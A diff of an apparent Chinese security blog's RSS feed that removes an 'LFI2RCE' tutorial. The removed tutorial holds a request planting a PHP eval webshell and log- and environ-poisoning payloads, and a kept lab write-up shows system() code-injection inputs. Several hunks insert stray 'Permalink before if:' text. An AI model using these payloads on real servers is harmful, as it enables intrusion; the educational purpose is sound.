@@ -1,241 +1,8 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>LFI on Zeddy's Blog</title><link>https://zeddyu.github.io/tags/lfi/</link><description>Recent content in LFI on Zeddy's Blog</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Fri, 07 Jun 2019 00:04:03 +0000</lastBuildDate><atom:link href="https://zeddyu.github.io/tags/lfi/atom.xml" rel="self" type="application/rss+xml"/><item><title>LFI2RCE</title><link>https://zeddyu.github.io/p/lfi2rce/</link><pubDate>Fri, 07 Jun 2019 00:04:03 +0000</pubDate><guid>https://zeddyu.github.io/p/lfi2rce/</guid><description>&lt;p>最近遇到了比较多的通过 LFI 提到 RCE 的漏洞利用方法。尤其是在遇到有 phpinfo 的情况下，这里做一个简单的总结与介绍。&lt;/p>
-&lt;h1 id="lfi">LFI
-&lt;/h1>&lt;ul>
-&lt;li>利用 session upload_progress&lt;/li>
-&lt;li>利用上传临时文件窗口期&lt;/li>
-&lt;li>利用环境变量&lt;/li>
-&lt;li>利用日志&lt;/li>
-&lt;/ul>
-&lt;p>总的来说，一般可以用 session 包含的方式尽量避免用 tmp 竞争的方式&amp;hellip;血的教训&amp;hellip;&lt;/p>
-&lt;h2 id="session-upload_progress">session upload_progress
-&lt;/h2>&lt;p>条件：开启&lt;code>session.upload_progress.enabled&lt;/code>，session 文件路径已知，且其中内容部分可控。&lt;/p>
-&lt;blockquote>
-&lt;p>当 &lt;code>session.upload_progress.enabled&lt;/code> INI 选项开启时，PHP 能够在每一个文件上传时监测上传进度。 这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态&lt;/p>
-&lt;p>当一个上传在处理中，同时 POST 一个与 INI 中设置的&lt;code>session.upload_progress.name&lt;/code>同名变量时，上传进度可以在&lt;code>$_SESSION&lt;/code>中获得。 当 PHP 检测到这种POST请求时，它会在&lt;code>$_SESSION&lt;/code>中添加一组数据, 索引是 &lt;code>session.upload_progress.prefix&lt;/code> 与 &lt;code>session.upload_progress.name&lt;/code>连接在一起的值。&lt;/p>
-&lt;/blockquote>
-&lt;p>php 的 session 文件的保存路径可以在 phpinfo 的 session.save_path 看到。&lt;/p>
-&lt;p>常见的php-session存放位置：&lt;/p>
-&lt;ul>
-&lt;li>/var/lib/php/sess_PHPSESSID&lt;/li>
-&lt;li>/var/lib/php/sess_PHPSESSID&lt;/li>
-&lt;li>/tmp/sess_PHPSESSID&lt;/li>
-&lt;li>/tmp/sessions/sess_PHPSESSID&lt;/li>
-&lt;/ul>
-&lt;p>我们可以构造一个上传界面&lt;/p>
-&lt;div class="highlight">&lt;div class="chroma">
-&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
-&lt;/span>&lt;span class="lnt"> 2
-&lt;/span>&lt;span class="lnt"> 3
-&lt;/span>&lt;span class="lnt"> 4
-&lt;/span>&lt;span class="lnt"> 5
-&lt;/span>&lt;span class="lnt"> 6
-&lt;/span>&lt;span class="lnt"> 7
-&lt;/span>&lt;span class="lnt"> 8
-&lt;/span>&lt;span class="lnt"> 9
-&lt;/span>&lt;span class="lnt">10
-&lt;/span>&lt;span class="lnt">11
-&lt;/span>&lt;span class="lnt">12
-&lt;/span>&lt;span class="lnt">13
-&lt;/span>&lt;span class="lnt">14
-&lt;/span>&lt;span class="lnt">15
-&lt;/span>&lt;span class="lnt">16
-&lt;/span>&lt;span class="lnt">17
-&lt;/span>&lt;span class="lnt">18
-&lt;/span>&lt;span class="lnt">19
-&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
-&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code class="language-html" data-lang="html">&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&amp;lt;!DOCTYPE html&amp;gt;&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">html&lt;/span> &lt;span class="na">lang&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;en&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">head&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">meta&lt;/span> &lt;span class="na">charset&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;UTF-8&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">meta&lt;/span> &lt;span class="na">name&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;viewport&amp;#34;&lt;/span> &lt;span class="na">content&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;width=device-width, initial-scale=1.0&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">meta&lt;/span> &lt;span class="na">http-equiv&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;X-UA-Compatible&amp;#34;&lt;/span> &lt;span class="na">content&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;ie=edge&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">title&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>Document&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">title&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">head&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">body&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">form&lt;/span> &lt;span class="na">action&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;http://zedd.cc/&amp;#34;&lt;/span> &lt;span class="na">method&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;POST&amp;#34;&lt;/span> &lt;span class="na">enctype&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;multipart/form-data&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">input&lt;/span> &lt;span class="na">type&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;file&amp;#34;&lt;/span> &lt;span class="na">name&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;file1&amp;#34;&lt;/span> &lt;span class="p">/&amp;gt;&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">input&lt;/span> &lt;span class="na">type&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;file&amp;#34;&lt;/span> &lt;span class="na">name&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;file2&amp;#34;&lt;/span> &lt;span class="p">/&amp;gt;&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">input&lt;/span> &lt;span class="na">type&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;hidden&amp;#34;&lt;/span> &lt;span class="na">name&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;PHP_SESSION_UPLOAD_PROGRESS&amp;#34;&lt;/span> &lt;span class="na">value&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;123&amp;#34;&lt;/span> &lt;span class="p">/&amp;gt;&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">form&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">body&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">html&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
-&lt;/div>
-&lt;/div>&lt;p>发送以下的 HTTP 请求&lt;/p>
-&lt;div class="highlight">&lt;div class="chroma">
-&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
-&lt;/span>&lt;span class="lnt"> 2
-&lt;/span>&lt;span class="lnt"> 3
-&lt;/span>&lt;span class="lnt"> 4
-&lt;/span>&lt;span class="lnt"> 5
-&lt;/span>&lt;span class="lnt"> 6
-&lt;/span>&lt;span class="lnt"> 7
-&lt;/span>&lt;span class="lnt"> 8
-&lt;/span>&lt;span class="lnt"> 9
-&lt;/span>&lt;span class="lnt">10
-&lt;/span>&lt;span class="lnt">11
-&lt;/span>&lt;span class="lnt">12
-&lt;/span>&lt;span class="lnt">13
-&lt;/span>&lt;span class="lnt">14
-&lt;/span>&lt;span class="lnt">15
-&lt;/span>&lt;span class="lnt">16
-&lt;/span>&lt;span class="lnt">17
-&lt;/span>&lt;span class="lnt">18
-&lt;/span>&lt;span class="lnt">19
-&lt;/span>&lt;span class="lnt">20
-&lt;/span>&lt;span class="lnt">21
-&lt;/span>&lt;span class="lnt">22
-&lt;/span>&lt;span class="lnt">23
-&lt;/span>&lt;span class="lnt">24
-&lt;/span>&lt;span class="lnt">25
-&lt;/span>&lt;span class="lnt">26
-&lt;/span>&lt;span class="lnt">27
-&lt;/span>&lt;span class="lnt">28
-&lt;/span>&lt;span class="lnt">29
-&lt;/span>&lt;span class="lnt">30
-&lt;/span>&lt;span class="lnt">31
-&lt;/span>&lt;span class="lnt">32
-&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
-&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code class="language-http" data-lang="http">&lt;span class="line">&lt;span class="cl">&lt;span class="nf">POST&lt;/span> &lt;span class="nn">/?file=/tmp/php/sess_a&lt;/span> &lt;span class="kr">HTTP&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="m">1.1&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Host&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">xxx.cc&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">User-Agent&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:67.0) Gecko/20100101 Firefox/67.0&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Accept&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Accept-Language&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Accept-Encoding&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">gzip, deflate&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Referer&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">http://zedd.cc/upload.php&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Content-Type&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">multipart/form-data; boundary=---------------------------695725616119701971467121808&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Content-Length&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">703&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Connection&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">close&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Cookie&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">PHPSESSID=a&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Upgrade-Insecure-Requests&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">1&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-----------------------------695725616119701971467121808
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Content-Disposition: form-data; name=&amp;#34;PHP_SESSION_UPLOAD_PROGRESS&amp;#34;
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;lt;?php file_put_contents(&amp;#34;/tmp/a&amp;#34;,&amp;#39;&amp;lt;?php eval($_POST[\&amp;#39;a\&amp;#39;]);?&amp;gt;&amp;#39;);?&amp;gt;
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-----------------------------695725616119701971467121808
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Content-Disposition: form-data; name=&amp;#34;file1&amp;#34;; filename=&amp;#34;1.txt&amp;#34;
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Content-Type: text/php
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">1
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-----------------------------695725616119701971467121808
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Content-Disposition: form-data; name=&amp;#34;file2&amp;#34;; filename=&amp;#34;2.txt&amp;#34;
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Content-Type: application/octet-stream
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">1
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-----------------------------695725616119701971467121808
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Content-Disposition: form-data; name=&amp;#34;submit&amp;#34;
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Submit
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-----------------------------695725616119701971467121808--
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
-&lt;/div>
-&lt;/div>&lt;p>但是因为 PHP session 会话机制的关系，仅仅一次包含得到的&lt;code>sess_a&lt;/code>文件为空，所以我们需要竞争包含，使用 burp intruder 等形式都可以。&lt;/p>
-&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190606203219.png"
-loading="lazy"
->&lt;/p>
-&lt;p>大概30次可以成功7次左右，可以看到包含文件回显，但是看不到具体的文件内容，因为有部分 php 代码被解析了，所以我们可以使用&lt;code>tail -f&lt;/code>监测&lt;code>sess_a&lt;/code>的文件变化查看文件内容，可以看到内容如下：&lt;/p>
-&lt;div class="highlight">&lt;div class="chroma">
-&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
-&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
-&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">upload_progress_&lt;/span>&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span> &lt;span class="nx">file_put_contents&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;/tmp/a&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s1">&amp;#39;&amp;lt;?php eval($_POST[\&amp;#39;a\&amp;#39;]);?&amp;gt;&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">|a:5:{s:10:&amp;#34;start_time&amp;#34;;i:1559816745;s:14:&amp;#34;content_length&amp;#34;;i:690;s:15:&amp;#34;bytes_processed&amp;#34;;i:690;s:4:&amp;#34;done&amp;#34;;b:0;s:5:&amp;#34;files&amp;#34;;a:1:{i:0;a:7:{s:10:&amp;#34;field_name&amp;#34;;s:5:&amp;#34;file1&amp;#34;;s:4:&amp;#34;name&amp;#34;;s:5:&amp;#34;1.php&amp;#34;;s:8:&amp;#34;tmp_name&amp;#34;;N;s:5:&amp;#34;error&amp;#34;;i:0;s:4:&amp;#34;done&amp;#34;;b:0;s:10:&amp;#34;start_time&amp;#34;;i:1559816745;s:15:&amp;#34;bytes_processed&amp;#34;;i:0;}}}
-&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
-&lt;/div>
-&lt;/div>&lt;p>可以发现其中有 php 代码，所以当我们使用&lt;code>include&lt;/code>包含该文件的时候会执行该文件当中的 php 代码，让其执行。&lt;/p>
-&lt;h2 id="tmp">tmp
-&lt;/h2>&lt;p>条件：tmp 文件路径已知&lt;/p>
-&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190606210821.jpg"
-loading="lazy"
->&lt;/p>
-&lt;p>php中上传文件，会创建临时文件。一般默认 php tmp 目录在 linux 下使用 /tmp 目录，而在 windows 下使用 c:\winsdows\temp 目录。在临时文件被删除之前，利用竞争即可包含该临时文件。&lt;/p>
-&lt;p>如果存在&lt;code>phpinfo()&lt;/code>界面即可配合&lt;code>phpinfo()&lt;/code>界面的回显来利用，例如向&lt;code>phpinfo()&lt;/code>界面上传一个文件，可以得到文件名的回显，再利用一些方法阻塞服务器的操作就可以进行包含了&lt;/p>
-&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190606213614.png"
-loading="lazy"
->&lt;/p>
-&lt;p>具体流程如下：&lt;/p>
-&lt;ol>
-&lt;li>发送包含了webshell的上传数据包给phpinfo页面，这个数据包的header、get等位置需要塞满垃圾数据&lt;/li>
-&lt;li>因为phpinfo页面会将所有数据都打印出来，1中的垃圾数据会将整个phpinfo页面撑得非常大&lt;/li>
-&lt;li>php默认的输出缓冲区大小为4096，可以理解为php每次返回4096个字节给socket连接&lt;/li>
-&lt;li>所以，我们直接操作原生socket，每次读取4096个字节。只要读取到的字符里包含临时文件名，就立即发送第二个数据包&lt;/li>
-&lt;li>此时，第一个数据包的socket连接实际上还没结束，因为php还在继续每次输出4096个字节，所以临时文件此时还没有删除&lt;/li>
-&lt;li>利用这个时间差，第二个数据包，也就是文件包含漏洞的利用，即可成功包含临时文件，最终getshell&lt;/li>
-&lt;/ol>
-&lt;p>可以参考脚本&lt;a class="link" href="https://github.com/vulhub/vulhub/blob/master/php/inclusion/exp.py" target="_blank" rel="noopener"
->exp.py&lt;/a>&lt;/p>
-&lt;h2 id="environ">environ
-&lt;/h2>&lt;p>利用条件：&lt;/p>
-&lt;ol>
-&lt;li>php以cgi方式运行，这样environ才会保持UA头。&lt;/li>
-&lt;li>environ文件存储位置已知，且environ文件可读。&lt;/li>
-&lt;/ol>
-&lt;p>在某些环境中，如果存在读取&lt;code>/proc/self/environ&lt;/code>的权限，可以检查是否环境变量存在有与 HTTP 环境有关的变量，例如&lt;code>HTTP_USER_AGENT&lt;/code>等等&lt;/p>
-&lt;div class="highlight">&lt;div class="chroma">
-&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
-&lt;/span>&lt;span class="lnt">2
-&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
-&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code class="language-http" data-lang="http">&lt;span class="line">&lt;span class="cl">&lt;span class="nf">GET&lt;/span> &lt;span class="nn">vulnerable.php?filename=../../../proc/self/environ&lt;/span> &lt;span class="kr">HTTP&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="m">1.1&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">User-Agent&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">&amp;lt;?=phpinfo(); ?&amp;gt;&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
-&lt;/div>
-&lt;/div>&lt;p>类似地，&lt;code>/proc/self/fd/id&lt;/code>（或它的符号链接：&lt;code>/dev/fd&lt;/code>）可以与 HTTP Referer 字段结合使用，以通过 apache2 将 payload 注入打开的错误日志中。 但是要确定当前进程的文件描述符。&lt;/p>
-&lt;h2 id="log">log
-&lt;/h2>&lt;h3 id="access-log">access log
-&lt;/h3>&lt;p>利用条件： 需要知道服务器日志的存储路径，且日志文件可读。&lt;/p>
-&lt;p>很多时候，web服务器会将请求写入到日志文件中，比如说 apache 。在用户发起请求时，会将请求写入access.log，当发生错误时将错误写入 error.log。默认情况下，日志保存路径在 /var/log/apache2/。&lt;/p>
-&lt;p>在一些场景中，log的地址是被修改掉的。你可以通过读取相应的配置文件后，再进行包含。&lt;/p>
-&lt;h3 id="ssh-log">ssh log
-&lt;/h3>&lt;p>利用条件：需要知道ssh-log的位置，且可读。默认情况下为 /var/log/auth.log&lt;/p>
-&lt;p>用ssh连接：&lt;/p>
-&lt;div class="highlight">&lt;div class="chroma">
-&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
-&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
-&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ubuntu@VM-207-93-ubuntu:~$ ssh &lt;span class="s1">&amp;#39;&amp;lt;?php phpinfo(); ?&amp;gt;&amp;#39;&lt;/span>@remotehost
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
-&lt;/div>
-&lt;/div>&lt;p>之后会提示输入密码等等，随便输入。&lt;/p>
-&lt;p>然后在 remotehost 的 ssh log 中即可写入php代码&lt;/p>
-&lt;h3 id="mail-log">mail log
-&lt;/h3>&lt;p>如果服务器存在邮件服务，则可以通过邮件发送 payload ，并在&lt;code>/var/log/&amp;lt;user&amp;gt;&lt;/code>下包含相关日志（每个其他用户都有自己的文件）。&lt;/p>
-&lt;div class="highlight">&lt;div class="chroma">
-&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
-&lt;/span>&lt;span class="lnt">2
-&lt;/span>&lt;span class="lnt">3
-&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
-&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">mail -s &lt;span class="s2">&amp;#34;&amp;lt;?=phpinfo();?&amp;gt;&amp;#34;&lt;/span> www-data@victim.com &amp;lt; /dev/null
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">---
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">GET vulnerable.php?filename&lt;span class="o">=&lt;/span>../../../var/log/www-data HTTP/1.1
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
-&lt;/div>
-&lt;/div>&lt;h1 id="reference">Reference
-&lt;/h1>&lt;p>&lt;a class="link" href="https://www.4hou.com/vulnerable/7774.html" target="_blank" rel="noopener"
->PHP Sessions的妙用之 将 LFI 转换为 RCE&lt;/a>&lt;/p>
-&lt;p>&lt;a class="link" href="https://chybeta.github.io/2017/10/08/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener"
->php文件包含漏洞&lt;/a>&lt;/p>
-&lt;p>&lt;a class="link" href="https://medium.com/bugbountywriteup/cvv-1-local-file-inclusion-ebc48e0e479a" target="_blank" rel="noopener"
->CVV #1: Local File Inclusion&lt;/a>&lt;/p></description></item><item><title>Web For Pentest</title><link>https://zeddyu.github.io/p/web-for-pentest/</link><pubDate>Fri, 08 Mar 2019 23:31:42 +0000</pubDate><guid>https://zeddyu.github.io/p/web-for-pentest/</guid><description>&lt;p>很久之前就想做的靶机，一直没做，最近有空清理一下。地址在&lt;a class="link" href="https://pentesterlab.com/exercises?dir=desc&amp;amp;only=free&amp;amp;sort=published_at" target="_blank" rel="noopener"
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>LFI on Zeddy's Blog</title><link>https://zeddyu.github.io/tags/lfi/</link><description>Recent content in LFI on Zeddy's Blog</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Fri, 08 Mar 2019 23:31:42 +0000</lastBuildDate><atom:link href="https://zeddyu.github.io/tags/lfi/atom.xml" rel="self" type="application/rss+xml"/><item><title>Web For Pentest</title><link>https://zeddyu.github.io/p/web-for-pentest/</link><pubDate>Fri, 08 Mar 2019 23:31:42 +0000</pubDate><guid>https://zeddyu.github.io/p/web-for-pentest/</guid><description>&lt;p>很久之前就想做的靶机，一直没做，最近有空清理一下。地址在&lt;a class="link" href="https://pentesterlab.com/exercises?dir=desc&amp;amp;only=free&amp;amp;sort=published_at" target="_blank" rel="noopener"
 >PentestLab&lt;/a>&lt;/p>
 &lt;p>[TOC]&lt;/p>
 &lt;h2 id="pre">Pre
 &lt;/h2>&lt;p>下载得到一个 iso 后直接用 vmware 装起来，&lt;code>ifconfig&lt;/code>得到 ip ，访问就可以看到主页了&lt;/p>
-&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610000990.jpg"
-loading="lazy"
->&lt;/p>
 &lt;h2 id="hacking">Hacking
 &lt;/h2>&lt;h3 id="xss">XSS
 &lt;/h3>&lt;h4 id="example-1">Example 1
@@ -606,7 +373,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>得到&lt;/p>
-&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610005160.jpg"
+&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610005160.jpg&lt;img src="https://blogpic.zdy.one/img/20190610005160.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h4 id="example-2-1">Example 2
@@ -1106,7 +873,7 @@ loading="lazy"
 &lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">id,$b-&amp;gt;id);}system(&amp;#39;ls&amp;#39;);//
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610003780.jpg"
+&lt;/div>&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610003780.jpg&lt;img src="https://blogpic.zdy.one/img/20190610003780.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h4 id="example-3-2">Example 3
@@ -1139,7 +906,7 @@ loading="lazy"
 &lt;/div>
 &lt;/div>&lt;p>使用&lt;code>/e&lt;/code>修饰符，&lt;code>preg_replace&lt;/code>会将&lt;code>replacement&lt;/code>参数当作 PHP 代码执行，也就是&lt;code>$_GET['new']&lt;/code>&lt;/p>
 &lt;p>所以用&lt;code>new=system('id');&amp;amp;pattern=/test/e&amp;amp;base=jutst test&lt;/code>，即可执行任意命令。&lt;/p>
-&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610008506.jpg"
+&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610008506.jpg&lt;img src="https://blogpic.zdy.one/img/20190610008506.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h3 id="file-upload">File Upload
